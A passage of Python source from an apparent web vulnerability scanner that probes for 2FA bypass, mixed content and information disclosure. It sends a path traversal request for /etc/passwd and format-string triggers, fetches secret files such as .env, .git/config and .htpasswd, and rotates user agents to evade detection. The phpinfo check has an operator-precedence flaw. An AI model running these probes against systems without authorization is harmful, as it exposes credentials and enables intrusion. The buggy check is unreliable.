            for path in api_paths:
                try:
                    self._rotate_ua()
                    resp = self.session.get(f"{base}{path}", timeout=5,
                                          verify=VERIFY_SSL, allow_redirects=False)
                    if resp.status_code == 200:
                        result['findings'].append({
                            'type': 'Direct API Access (2FA Bypass)',
                            'url': f"{base}{path}",
                            'severity': 'High',
                            'note': 'Authenticated endpoint accessible without 2FA verification'
                        })
                except Exception:
                    continue

            # Test 4: OTP Reuse
            result['tested'] += 1
            result['findings'].append({
                'type': 'OTP Reuse Test Needed',
                'url': tfa_url,
                'severity': 'Medium',
                'note': 'Manual test: Use same valid OTP twice - check if accepted'
            })

        return result

    def _find_2fa_endpoints(self, url):
        """Find 2FA/OTP verification endpoints"""
        endpoints = []
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        tfa_paths = [
            '/verify', '/verify-otp', '/2fa', '/2fa/verify',
            '/otp/verify', '/auth/2fa', '/auth/verify',
            '/mfa/verify', '/challenge', '/auth/challenge',
            '/two-factor', '/tfa', '/login/2fa',
            '/api/2fa/verify', '/api/v1/2fa/verify',
            '/api/otp/verify', '/api/auth/2fa',
        ]

        for path in tfa_paths:
            try:
                test_url = f"{base}{path}"
                self._rotate_ua()
                resp = self.session.get(test_url, timeout=5, verify=VERIFY_SSL)
                if resp.status_code in [200, 401, 403]:
                    endpoints.append(test_url)
            except Exception:
                continue

        # Also check for 2FA forms in login page
        try:
            self._rotate_ua()
            resp = self.session.get(url, timeout=DEFAULT_TIMEOUT, verify=VERIFY_SSL)
            soup = BeautifulSoup(resp.text, 'html.parser')
            for form in soup.find_all('form'):
                action = form.get('action', '')
                # Check for OTP/code inputs
                has_otp = any(inp.get('name', '').lower() in ['otp', 'code', 'token', 'pin', 'verification']
                            for inp in form.find_all('input'))
                if has_otp:
                    endpoints.append(urljoin(url, action))
        except Exception:
            pass

        return list(set(endpoints))

    # ========================================================================
    # 74: MIXED CONTENT SCANNER
    # ========================================================================

    def scan_mixed_content(self, url):
        """
        Find mixed content (HTTP resources on HTTPS pages).
        Passive: images, audio, video.
        Active: scripts, stylesheets, iframes, XHR.
        """
        result = {'vulnerable': False, 'findings': [], 'passive': [], 'active': [], 'tested': 1}

        # Only check HTTPS pages
        if not url.startswith('https://'):
            result['note'] = 'Target is not HTTPS - mixed content not applicable'
            return result

        try:
            self._rotate_ua()
            resp = self.session.get(url, timeout=DEFAULT_TIMEOUT, verify=VERIFY_SSL)
        except Exception:
            result['error'] = 'Cannot connect to target'
            return result

        soup = BeautifulSoup(resp.text, 'html.parser')

        # Check for passive mixed content
        passive_tags = {
            'img': 'src',
            'audio': 'src',
            'video': 'src',
            'object': 'data',
        }

        for tag_name, attr in passive_tags.items():
            for tag in soup.find_all(tag_name, **{attr: True}):
                src = tag.get(attr, '')
                if src.startswith('http://'):
                    result['passive'].append({
                        'type': 'Passive Mixed Content',
                        'tag': tag_name,
                        'url': src,
                        'severity': 'Low',
                        'note': f'HTTP {tag_name} loaded on HTTPS page'
                    })

        # Check for active mixed content
        active_tags = {
            'script': 'src',
            'link': 'href',
            'iframe': 'src',
            'embed': 'src',
            'form': 'action',
        }

        for tag_name, attr in active_tags.items():
            for tag in soup.find_all(tag_name, **{attr: True}):
                src = tag.get(attr, '')
                if src.startswith('http://'):
                    result['vulnerable'] = True
                    result['active'].append({
                        'type': 'Active Mixed Content',
                        'tag': tag_name,
                        'url': src,
                        'severity': 'Medium',
                        'note': f'HTTP {tag_name} loaded on HTTPS page - can be intercepted'
                    })

        # Check for inline mixed content references
        for script in soup.find_all('script'):
            if script.string and 'http://' in script.string:
                # Check for XHR/fetch to HTTP
                if any(x in script.string.lower() for x in ['xmlhttprequest', 'fetch(', 'ajax']):
                    http_urls = regex_cache.findall(r'http://[^\s"\'<>]+', script.string)
                    for h_url in http_urls:
                        result['vulnerable'] = True
                        result['active'].append({
                            'type': 'Active Mixed Content in JS',
                            'url': h_url,
                            'severity': 'Medium',
                            'note': 'JavaScript makes HTTP requests from HTTPS page'
                        })

        result['total_passive'] = len(result['passive'])
        result['total_active'] = len(result['active'])
        result['findings'] = result['passive'] + result['active']

        return result

    # ========================================================================
    # 75: INFORMATION DISCLOSURE HUNTER
    # ========================================================================

    def scan_info_disclosure(self, url):
        """
        Hunt for information disclosure vulnerabilities.
        Error pages, debug modes, source maps, version disclosure, stack traces.
        """
        result = {'vulnerable': False, 'findings': [], 'tested': 0}

        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        # Test 1: Error Page Information Disclosure
        result['tested'] += 1
        try:
            self._rotate_ua()
            # Trigger errors with malformed requests
            error_triggers = [
                (url + "/%00", 'Null byte in path'),
                (url + "/....//....//etc/passwd", 'Path traversal attempt'),
                (f"{base}/api/v1/users/-1", 'Invalid API resource'),
                (f"{base}/%n%n%n%n", 'Format string'),
            ]

            for trigger_url, desc in error_triggers:
                try:
                    self._rotate_ua()
                    resp = self.session.get(trigger_url, timeout=DEFAULT_TIMEOUT,
                                          verify=VERIFY_SSL, allow_redirects=False)
                    self._check_disclosure(resp, result, desc)
                except Exception:
                    continue
        except Exception:
            pass

        # Test 2: Debug Mode
        result['tested'] += 1
        debug_indicators = [
            'debug=True', 'DEBUG=True', 'debug=1', 'APP_DEBUG=true',
            'debug_mode=1', 'django_debug=true', 'flask_debug=true',
        ]
        for param in ['debug', 'DEBUG', 'debug_mode', '_debug']:
            try:
                self._rotate_ua()
                test_url = f"{url}?{param}=true"
                resp = self.session.get(test_url, timeout=DEFAULT_TIMEOUT, verify=VERIFY_SSL)
                if any(x in resp.text.lower() for x in ['traceback', 'stack trace', 'debug mode',
                                                         'django debug', 'flask debug',
                                                         'laravel debug', 'whoops']):
                    result['vulnerable'] = True
                    result['findings'].append({
                        'type': 'Debug Mode Enabled',
                        'parameter': param,
                        'severity': 'High',
                        'note': 'Debug mode accessible - exposes sensitive server information'
                    })
            except Exception:
                continue

        # Test 3: Source Map Exposure
        result['tested'] += 1
        try:
            self._rotate_ua()
            resp = self.session.get(url, timeout=DEFAULT_TIMEOUT, verify=VERIFY_SSL)
            # Find JS files and check for source maps
            js_urls = regex_cache.findall(r'src=["\']([^"\']*\.js[^"\']*)["\']', resp.text)
            for js_url in js_urls[:10]:
                full_js = urljoin(url, js_url)
                # Check for .map file
                map_url = full_js + '.map'
                try:
                    self._rotate_ua()
                    map_resp = self.session.get(map_url, timeout=5, verify=VERIFY_SSL)
                    if map_resp.status_code == 200 and map_resp.text.strip().startswith('{'):
                        result['vulnerable'] = True
                        result['findings'].append({
                            'type': 'JavaScript Source Map Exposed',
                            'url': map_url,
                            'severity': 'Medium',
                            'note': 'Source map exposes original source code including comments and variable names'
                        })
                except Exception:
                    continue
        except Exception:
            pass

        # Test 4: Server Version Disclosure
        result['tested'] += 1
        try:
            self._rotate_ua()
            resp = self.session.get(url, timeout=DEFAULT_TIMEOUT, verify=VERIFY_SSL)

            # Check headers for version info
            version_headers = ['Server', 'X-Powered-By', 'X-AspNet-Version',
                             'X-Runtime', 'X-Version', 'X-API-Version']
            for header in version_headers:
                value = resp.headers.get(header, '')
                if value and regex_cache.search(r'\d+\.\d+', value):
                    result['findings'].append({
                        'type': 'Server Version Disclosure',
                        'header': header,
                        'value': value,
                        'severity': 'Low',
                        'note': f'{header}: {value} - version info helps attackers find CVEs'
                    })
        except Exception:
            pass

        # Test 5: PHP Info Exposure
        result['tested'] += 1
        try:
            phpinfo_url = f"{base}/phpinfo.php"
            self._rotate_ua()
            resp = self.session.get(phpinfo_url, timeout=5, verify=VERIFY_SSL)
            if resp.status_code == 200 and 'phpinfo' in resp.text.lower() or 'php version' in resp.text.lower():
                result['vulnerable'] = True
                result['findings'].append({
                    'type': 'PHP Info Page Exposed',
                    'url': phpinfo_url,
                    'severity': 'High',
                    'note': 'phpinfo() page exposes complete server configuration'
                })
        except Exception:
            pass

        # Test 6: Stack Traces in Error Messages
        result['tested'] += 1
        try:
            # Send malformed data to trigger errors
            self._rotate_ua()
            resp = self.session.post(url, data={'test': '<>"\''},
                                   timeout=DEFAULT_TIMEOUT, verify=VERIFY_SSL)
            trace_patterns = [
                r'Traceback \(most recent call last\)',
                r'at [a-zA-Z]+\.[a-zA-Z]+\([^)]+\.py:\d+\)',
                r'Exception in thread',
                r'java\.lang\.[a-zA-Z]+Exception',
                r'System\.[a-zA-Z]+Exception',
                r'Fatal error:.+in .+\.php',
                r'Warning:.+in .+\.php',
            ]
            for pattern in trace_patterns:
                if regex_cache.search(pattern, resp.text):
                    result['vulnerable'] = True
                    result['findings'].append({
                        'type': 'Stack Trace Disclosure',
                        'pattern': pattern,
                        'severity': 'Medium',
                        'note': 'Stack traces expose internal code structure and file paths'
                    })
                    break
        except Exception:
            pass

        # Test 7: Common sensitive file exposure
        result['tested'] += 1
        sensitive_files = [
            '/.env', '/.env.bak', '/.env.local', '/.env.production',
            '/.git/config', '/.git/HEAD', '/.gitignore',
            '/.htaccess', '/.htpasswd',
            '/web.config', '/Web.config',
            '/config.json', '/config.yml', '/config.yaml',
            '/package.json', '/composer.json', '/Gemfile',
            '/Dockerfile', '/docker-compose.yml',
            '/.DS_Store', '/Thumbs.db',
            '/server-status', '/server-info',
            '/wp-config.php.bak', '/database.yml',
            '/.svn/entries', '/.hg/store',
        ]

        for path in sensitive_files:
            try:
                self._rotate_ua()
                file_url = f"{base}{path}"
                resp = self.session.get(file_url, timeout=5, verify=VERIFY_SSL)
                if resp.status_code == 200 and len(resp.text) > 10:
                    result['vulnerable'] = True
                    result['findings'].append({
                        'type': 'Sensitive File Exposed',
                        'url': file_url,
                        'size': len(resp.text),
                        'severity': 'High',
                        'note': f'Sensitive file {path} is publicly accessible'
                    })
            except Exception:
                continue

        return result

    def _check_disclosure(self, resp, result, trigger_desc):
        """Check response for information disclosure indicators"""
        disclosure_patterns = [
            (r'Traceback \(most recent call last\)', 'Python Stack Trace', 'Medium'),
            (r'java\.lang\.[a-zA-Z]+Exception', 'Java Exception', 'Medium'),
            (r'System\.[a-zA-Z]+Exception', '.NET Exception', 'Medium'),
            (r'Fatal error:.+in .+\.php', 'PHP Error', 'Medium'),
            (r'/var/www/', 'Internal Path Disclosure', 'Low'),
            (r'/home/[a-zA-Z]+/', 'Home Directory Path', 'Low'),
            (r'C:\\Users\\', 'Windows Path Disclosure', 'Low'),
            (r'SQL syntax.*MySQL', 'MySQL Error', 'Medium'),
            (r'PostgreSQL.*ERROR', 'PostgreSQL Error', 'Medium'),
            (r'Microsoft OLE DB', 'MSSQL Error', 'Medium'),
            (r'ORA-\d{5}', 'Oracle Error', 'Medium'),
        ]

        for pattern, desc, severity in disclosure_patterns:
            if regex_cache.search(pattern, resp.text, re.I):
                result['vulnerable'] = True
                result['findings'].append({
                    'type': desc,
                    'trigger': trigger_desc,
                    'severity': severity,
                    'note': f'Information disclosed via {trigger_desc}'
                })
